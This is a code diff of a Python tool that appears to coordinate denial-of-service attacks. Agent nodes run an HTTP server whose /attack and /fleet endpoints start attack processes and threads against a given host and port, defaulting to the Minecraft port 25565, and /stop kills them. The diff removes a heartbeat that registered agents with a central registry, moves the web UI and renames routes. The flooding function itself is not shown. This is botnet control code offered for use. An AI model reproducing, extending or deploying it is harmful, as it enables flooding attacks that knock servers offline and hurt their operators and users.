@@ -111,7 +111,6 @@ def agent():
     procs = int(os.environ.get("PROCS", "2"))
     threads = int(os.environ.get("THREADS", "32"))
     token = os.environ.get("TOKEN", "")
-    registry = os.environ.get("REGISTRY", "")
     start = time.time()
     kids = []
     target = {"host": None, "port": None}
@@ -153,43 +152,42 @@ def agent():
         def do_GET(self):
             u = urllib.parse.urlparse(self.path)
             q = {k: v[0] for k, v in urllib.parse.parse_qs(u.query).items()}
+            if u.path in ("/", "/ui"):
+                try:
+                    body = open(os.path.join(os.path.dirname(SELF), "ui", "index.html"), "rb").read()
+                except OSError:
+                    body = b"ui/index.html not found"
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html; charset=utf-8")
+                self.send_header("Content-Length", str(len(body)))
+                self.send_header("Access-Control-Allow-Origin", "*")
+                self.end_headers()
+                self.wfile.write(body)
+                return
             if token and q.get("k") != token:
                 return self.reply({"error": "unauthorized"}, 401)
-            if u.path == "/":
+            if u.path == "/status":
                 with LOCK:
                     run = any(p.poll() is None for p in kids)
                     n = len(kids)
                 return self.reply({"node": node, "uptime_s": round(time.time() - start, 1),
                                    "running": run, "target": target["host"],
                                    "port": target["port"], "procs": n})
-            if u.path == "/attack":
+            if u.path == "/nodes":
+                me = os.environ.get("RENDER_EXTERNAL_URL") or f"http://{node}:{port}"
+                return self.reply([{"node": node, "url": me}])
+            if u.path in ("/attack", "/fleet"):
                 attack(q.get("host", "127.0.0.1"), int(q.get("port", 25565)),
                        int(q.get("procs", procs)), int(q.get("threads", threads)),
                        q.get("mc") == "1")
-                return self.reply({"ok": True})
+                return self.reply({"fired": 1})
             if u.path == "/stop":
                 kill_all()
                 return self.reply({"ok": True})
             return self.reply({"error": "not found"}, 404)
 
-    def heartbeat():
-        url = os.environ.get("RENDER_EXTERNAL_URL") or f"http://{node}:{port}"
-        payload = json.dumps({"node": node, "url": url}).encode()
-        while True:
-            try:
-                req = urllib.request.Request(registry.rstrip("/") + "/register"
-                                              + (f"?k={token}" if token else ""),
-                                              data=payload, method="POST",
-                                              headers={"Content-Type": "application/json"})
-                urllib.request.urlopen(req, timeout=10).read()
-            except Exception:
-                pass
-            time.sleep(30)
-
-    if registry:
-        threading.Thread(target=heartbeat, daemon=True).start()
     print(f"agent node={node} :{port} procs={procs} threads={threads} "
-          f"token={'yes' if token else 'no'} registry={registry or '-'}")
+          f"token={'yes' if token else 'no'}")
     ThreadingHTTPServer(("0.0.0.0", port), H).serve_forever()
 
 
@@ -219,7 +217,6 @@ def registry():
         def reply(self, obj, code=200):
             b = json.dumps(obj).encode()
             self.send_response(code)
-            self.send_header("Access-Control-Allow-Origin", "*")
             self.send_header("Content-Type", "application/json")
             self.send_header("Content-Length", str(len(b)))
             self.end_headers()
@@ -228,21 +225,9 @@ def registry():
         def route(self):
             u = urllib.parse.urlparse(self.path)
             q = {k: v[0] for k, v in urllib.parse.parse_qs(u.query).items()}
-            if u.path in ("/", "/ui"):
-                try:
-                    body = open(os.path.join(os.path.dirname(SELF), "ui", "index.html"), "rb").read()
-                except OSError:
-                    body = b"ui/index.html not found"
-                self.send_response(200)
-                self.send_header("Content-Type", "text/html; charset=utf-8")
-                self.send_header("Content-Length", str(len(body)))
-                self.send_header("Access-Control-Allow-Origin", "*")
-                self.end_headers()
-                self.wfile.write(body)
-                return
             if token and q.get("k") != token:
                 return self.reply({"error": "unauthorized"}, 401)
-            if u.path == "/nodes":
+            if u.path == "/":
                 with LOCK:
                     return self.reply(list(nodes.values()))
             if u.path == "/fleet":
@@ -272,7 +257,7 @@ def main():
     elif argv:
         mode = "drip"
     else:
-        mode = "registry" if os.environ.get("REGISTRY") else "agent"
+        mode = "agent"
     if mode == "drip":
         drip(argv)
     elif mode == "registry":
@@ -283,300 +268,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
